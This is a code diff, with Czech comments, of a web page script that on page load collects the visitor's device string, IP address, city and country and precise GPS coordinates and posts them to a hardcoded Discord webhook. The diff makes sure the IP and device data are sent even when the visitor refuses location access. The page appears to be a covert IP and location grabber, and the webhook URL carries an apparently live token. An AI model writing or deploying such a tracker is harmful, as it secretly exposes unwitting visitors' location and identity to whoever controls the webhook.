@@ -7,33 +7,34 @@
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahraď svým webhookem
 
-        function getLocation() {
+        // Funkce pro získání informací o zařízení a IP
+        function getDeviceAndIP() {
             let device = navigator.userAgent; // Detekce zařízení
 
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(position => {
-                    const lat = position.coords.latitude.toFixed(6);
-                    const lon = position.coords.longitude.toFixed(6);
-                    getIP(device, `📍 GPS: ${lat}, ${lon}`);
-                }, () => {
-                    getIP(device, "🚫 GPS zamítnuta");
-                });
-            } else {
-                getIP(device, "🚫 GPS není podporována");
-            }
-        }
-
-        function getIP(device, gpsData) {
             fetch("https://ipinfo.io/json")
             .then(response => response.json())
             .then(data => {
-                const message = `📱 Zařízení: ${device}\n${gpsData}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})`;
+                const message = `📱 Zařízení: ${device}\n🌍 IP Adresa: ${data.ip} (Město: ${data.city}, Země: ${data.country})`;
 
-                sendToDiscord(message);
+                // Pokud je dostupná GPS, přidáme ji do zprávy
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        const lat = position.coords.latitude.toFixed(6);
+                        const lon = position.coords.longitude.toFixed(6);
+                        sendToDiscord(`${message}\n📍 GPS: ${lat}, ${lon}`);
+                    }, () => {
+                        // Pokud není možné získat GPS, odešleme pouze zařízení a IP
+                        sendToDiscord(message);
+                    });
+                } else {
+                    // Pokud geolokace není podporována, pošleme jen zařízení a IP
+                    sendToDiscord(message);
+                }
             })
             .catch(error => console.error("Chyba získání IP:", error));
         }
 
+        // Funkce pro odeslání zprávy na Discord
         function sendToDiscord(message) {
             fetch(WEBHOOK_URL, {
                 method: "POST",
@@ -42,7 +43,8 @@
             }).catch(error => console.error("Chyba odesílání:", error));
         }
 
-        window.onload = getLocation;
+        // Načtení stránky
+        window.onload = getDeviceAndIP;
     </script>
 </head>
 <body>
